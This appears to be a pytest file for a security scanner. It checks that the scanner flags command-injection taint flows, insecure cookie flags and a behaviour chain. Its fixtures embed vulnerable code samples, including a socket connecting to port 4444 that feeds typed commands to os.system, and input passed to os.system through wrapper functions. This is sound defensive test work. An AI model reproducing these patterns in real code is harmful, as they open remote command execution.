from scanner.models import ApplicationModel, FileModel
from scanner.models import ProcessEvent
from scanner.streaming_scan import stream_project_scan
from scanner.behavior_analyzer import dedupe_process_events
from scanner.tamper_analyzer import analyze_tamperability


def _drain(gen):
    model = None
    while True:
        try:
            next(gen)
        except StopIteration as ex:
            model = ex.value
            break
    return model


def test_behavior_chain_correlation_emits_indicator(tmp_path):
    src = """
import socket, os
s = socket.socket()
s.connect(("8.8.8.8", 4444))
cmd = input("cmd:")
os.system(cmd)
"""
    (tmp_path / "x.py").write_text(src, encoding="utf-8")
    model = _drain(stream_project_scan(str(tmp_path), delay_fn=lambda _s: None, load_content=True))
    assert model is not None
    assert any(m.type == "Behavior Correlation Chain" for m in model.malicious_indicators)


def test_tamper_web_profile_flags_cookie_issue(monkeypatch):
    monkeypatch.setenv("SAST_TAMPER_PROFILE", "web_api")
    src = """
def f(resp):
    resp.set_cookie("sid", "x", secure=False, httponly=False)
"""
    fm = FileModel(
        file_name="app.py",
        file_path="app.py",
        file_type="Python",
        extension=".py",
        file_size=len(src.encode("utf-8")),
        content=src,
    )
    model = ApplicationModel(project_path="demo", files=[fm], file_count=1)
    analyze_tamperability(model)
    names = {i.type for i in model.tamperability}
    assert "Insecure Cookie Flag" in names
    assert "HttpOnly Disabled Cookie" in names


def test_interprocedural_wrapper_taint_to_sink(tmp_path):
    src = """
import os
def run_cmd(x):
    os.system(x)
def endpoint():
    cmd = input("cmd:")
    run_cmd(cmd)
"""
    (tmp_path / "wrap.py").write_text(src, encoding="utf-8")
    model = _drain(stream_project_scan(str(tmp_path), delay_fn=lambda _s: None, load_content=True))
    assert model is not None
    assert any(e.type == "Interprocedural Sink Call" and e.tainted for e in model.process_events)
    assert any(m.type == "User Input to Wrapper Sink" for m in model.malicious_indicators)


def test_cross_file_interprocedural_wrapper_taint_to_sink(tmp_path):
    (tmp_path / "helpers.py").write_text(
        """
import os
def run_cmd(x):
    os.system(x)
""",
        encoding="utf-8",
    )
    (tmp_path / "api.py").write_text(
        """
from helpers import run_cmd
def endpoint():
    cmd = input("cmd:")
    run_cmd(cmd)
""",
        encoding="utf-8",
    )
    model = _drain(stream_project_scan(str(tmp_path), delay_fn=lambda _s: None, load_content=True))
    assert model is not None
    assert any(e.type == "Interprocedural Cross-File Sink Call" and e.tainted for e in model.process_events)
    assert any(m.type == "User Input to Cross-File Wrapper Sink" for m in model.malicious_indicators)


def test_process_event_dedupe_prefers_tainted_higher_risk():
    a = ProcessEvent(file="x.py", line=10, type="Interprocedural Sink Call", function="run_cmd", risk="Medium", detail="a", tainted=False)
    b = ProcessEvent(file="x.py", line=10, type="Interprocedural Sink Call", function="run_cmd", risk="High", detail="b", tainted=True)
    out = dedupe_process_events([a, b])
    assert len(out) == 1
    assert out[0].risk == "High"
    assert out[0].tainted is True
